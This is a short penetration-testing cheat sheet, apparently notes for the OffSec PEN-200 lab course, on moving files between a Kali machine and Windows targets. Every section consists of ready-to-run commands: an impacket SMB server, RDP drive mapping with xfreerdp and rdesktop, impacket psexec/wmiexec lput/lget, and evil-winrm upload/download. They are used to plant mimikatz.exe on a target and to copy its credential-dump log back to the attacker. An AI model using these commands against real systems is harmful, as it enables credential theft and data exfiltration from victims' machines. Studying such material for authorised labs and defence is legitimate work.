1) SMB: 
On Kali:

```
impacket-smbserver test . -smb2support  -username kourosh -password kourosh
```

On Windows:

```
net use m: \\Kali_IP\test /user:kourosh kourosh
copy mimikatz.log m:\
```

2) RDP mounting shared folder:
Using xfreerdp:
On Kali:

```
xfreerdp3 /clipboard /cert:ignore /compression /auto-reconnect /u:offsec /p:lab /v:192.168.116.196 /w:1600 /h:800 /drive:test,/home/saitama/Desktop
```

On windows:

```
copy mimikatz.log \\tsclient\test\mimikatz.log
```

Using rdesktop:
On Kali: 

```
rdesktop -z -P -x m -u offsec -p lab 192.168.212.250 -r disk:test=/home/kali/Documents/pen-200
```

On Windows:

```
copy mimikatz.log \\tsclient\test\mimikatz.log
```

3) Impacket tools:
psexec and wmiexec are shipped with built in feature for file transfer.
Note: By default whether you upload (lput) or download (lget) a file, it'll be writte in C:\Windows path.
Uploading mimikatz.exe to the target machine:

```
C:\Windows\system32> lput mimikatz.exe
[*] Uploading mimikatz.exe to ADMIN$\/
C:\Windows\system32> cd C:\windows
C:\Windows> dir /b mimikatz.exe
mimikatz.exe
```

Downloading mimikatz.log:

```
C:\Windows> lget mimikatz.log
[*] Downloading ADMIN$\mimikatz.log
```

4) Evil-winrm:
Uploading files:

```
upload mimikatz.exe C:\windows\tasks\mimikatz.exe
```

Downloading files:

```
download mimikatz.log /home/kali/Documents/pen-200
```
